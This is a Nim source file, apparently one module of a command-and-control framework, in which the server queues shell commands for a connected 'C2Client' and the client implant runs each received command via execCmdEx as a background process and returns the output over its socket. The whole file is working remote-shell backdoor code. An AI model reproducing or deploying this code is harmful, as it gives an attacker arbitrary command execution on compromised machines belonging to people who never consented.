when defined(server):
  import asyncdispatch, json
  import ../server/[types, communication]

when defined(client):
  import osproc, os, net
  import ../client/communication

when defined(server):
  proc sendTask*(client: C2Client, cmd: string): Future[Task] {.async.} =
    return await client.sendClientTask("shell", %*{ "shellCmd": cmd })

when defined(client):
  proc executeTask*(socket: Socket, taskId: int, toExec: string) =
    try:
      let (output, _) = execCmdEx(toExec, workingDir = getCurrentDir(), options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
      socket.sendOutput(taskId, "SHELL", output)
    except OSError:
      socket.sendOutput(taskId, "SHELL", "", getCurrentExceptionMsg())
